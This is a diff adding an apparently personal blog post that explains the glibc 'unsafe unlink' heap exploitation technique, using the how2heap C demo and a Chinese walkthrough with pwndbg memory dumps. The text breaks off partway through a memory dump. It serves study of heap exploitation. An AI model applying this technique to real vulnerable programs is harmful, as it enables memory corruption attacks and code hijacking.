@@ -251,6 +251,154 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/12/unsafe unlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/12/unsafe unlink/" itemprop="url">unsafe unlink</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-12T16:53:00+08:00">
+                2019-08-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/how2heap/" itemprop="url" rel="index">
+                    <span itemprop="name">how2heap</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>unlink</p>
+<p>利用损坏的块自由地获取任意写入。</p>
+<p>利用free改写全局指针chunk0_ptr达到任意内存写的目的，即不安全取消链接。</p>
+<h3 id="0x01源代码"><a href="#0x01源代码" class="headerlink" title="0x01源代码"></a>0x01源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//fprintf(stderr, "We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\n");</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\n");</span></span><br><span class="line"><span class="comment">//chunk0_ptr[1] = sizeof(size_t);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr-&gt;size (%p)\n", ((char *)chunk0_ptr + chunk0_ptr[1]), &amp;chunk0_ptr[1]);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, "You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02代码分析"><a href="#0x02代码分析" class="headerlink" title="0x02代码分析"></a>0x02代码分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">首先我们创建两个chunk 分别为chunk_0 和chunk_1</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x602ff0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span>            &lt;- chunk <span class="number">0</span></span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span>            &lt;- chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line">紧接着我们假设这个时候我们有堆溢出，可以对chunk 0 进行修改，我们伪造个chunk。由于有P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) 这样的检查。我们可以利用全局指针 chunk0_ptr构造 fake chunk 来绕过它：</span><br><span class="line"></span><br><span class="line">我们伪造 fake chunk 的fd 为 chunk0_ptr[<span class="number">2</span>] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">我们伪造 fake chunk 的bk 为chunk0_ptr[<span class="number">3</span>] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">这个时候</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x602ff0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span>   &lt;-- chunk <span class="number">0</span></span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span>   &lt;-- fake chunk</span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000602058</span>  <span class="number">0x0000000000602060</span>        fd ,bk</span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span>    &lt;-- chunk <span class="number">1</span> &lt;-- prev_size</span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line">Pwndbg&gt; x/<span class="number">5</span>gx <span class="number">0x0000000000602058</span></span><br><span class="line"><span class="number">0x602058</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd2520</span>               &lt;-- fake chunk FD</span><br><span class="line"><span class="number">0x602068</span> &lt;completed<span class="number">.7557</span>&gt;:  <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000603010</span> &lt;-- bk pointer</span><br><span class="line"><span class="number">0x602078</span>:   <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt; x/<span class="number">5</span>gx <span class="number">0x0000000000602060</span></span><br><span class="line"><span class="number">0x602060</span> &lt;stderr@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>&gt;: <span class="number">0x00007ffff7dd2520</span>  <span class="number">0x0000000000000000</span> &lt;-- fake chunk BK</span><br><span class="line"><span class="number">0x602070</span> &lt;chunk0_ptr&gt;:  <span class="number">0x0000000000603010</span>  <span class="number">0x0000000000000000</span>  &lt;-- fd pointer</span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt; heap</span><br><span class="line">这样就就会变成我 fake chunk 的 FD 块的bk指向 fake chunk， fake chunk 的BK 块 的fd指向fake chunk ，这样就能绕过检查。</span><br><span class="line"></span><br><span class="line">另外利用 chunk0 的溢出漏洞，通过修改 chunk <span class="number">1</span> 的 prev_size 为 fake chunk 的大小，修改 PREV_INUSE 标志位为 <span class="number">0</span>，将 fake chunk 伪造成一个 free chunk。</span><br><span class="line"></span><br><span class="line">libc 使用 size 域的最低 <span class="number">3</span> 位来 存储一些其它信息。相关的掩码信息定义如下:</span><br><span class="line"></span><br><span class="line"><span class="comment">#define PREV_INUSE 0x1</span></span><br><span class="line"><span class="comment">#define IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="comment">#define NON_MAIN_ARENA 0x4</span></span><br><span class="line">从以上代码定义可以推断, size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 <span class="number">0</span> 则表示上一块为被释放的块, 这个时候此块的 PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 <span class="number">2</span> 位表示此块是否由 mmap 分配, 如果 此位为 <span class="number">0</span> 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 <span class="number">3</span> 位表示此块是否不属于 main_arena</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x602ff0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000602058</span>  <span class="number">0x0000000000602060</span></span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000080</span>  <span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line">这样，我们去free chunk1，这个时候系统会检测到 fake chunk是释放状态，会触发 unlink ，fake chunk会向后合并， chunk0会被吞并。</span><br><span class="line"></span><br><span class="line">unlink 的操作如下：</span><br><span class="line"></span><br><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br><span class="line">根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：</span><br><span class="line"></span><br><span class="line">FD = P-&gt;fd = &amp;P - 24</span><br><span class="line">BK = P-&gt;bk = &amp;P - 16</span><br><span class="line">FD-&gt;bk = *(&amp;P - 24 + 24) = P</span><br><span class="line">BK-&gt;fd = *(&amp;P - 16 + 16) = P</span><br><span class="line">这样就通过了 unlink 的检查，最终效果为：</span><br><span class="line"></span><br><span class="line">FD-&gt;bk = P = BK = &amp;P - 16</span><br><span class="line">BK-&gt;fd = P = FD = &amp;P - 24</span><br><span class="line">最后原本指向堆上 fake chunk 的指针 P 指向了自身地址减 <span class="number">24</span> 的位置,这就意味着如果我们能对堆P进行写入，则就有了任意内存写。如果我们能对堆P进行读取，则就有了信息泄露。</span><br><span class="line"></span><br><span class="line">在这个例子中，最后chunk0_ptr 和chunk0_ptr[<span class="number">3</span>] 指向的地方是一样的。相对我们如果对chunk0_ptr[<span class="number">3</span>]修改，也是对chunk0_ptr进行了修改。</span><br><span class="line"></span><br><span class="line">在程序中，程序先对chunk0_ptr[<span class="number">3</span>]进行了修改，让它指向了victim_string 字符串的指针。</span><br><span class="line"></span><br><span class="line"><span class="number">50</span>   strcpy(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line"> ► <span class="number">51</span>   chunk0_ptr[<span class="number">3</span>] = (uint64_t) victim_string;</span><br><span class="line">（如果这个地址是 got 表地址，我们紧接着就可以 进行 劫持 got 的操作。）</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000602058</span>  <span class="number">0x00007fffffffe3d0</span></span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span 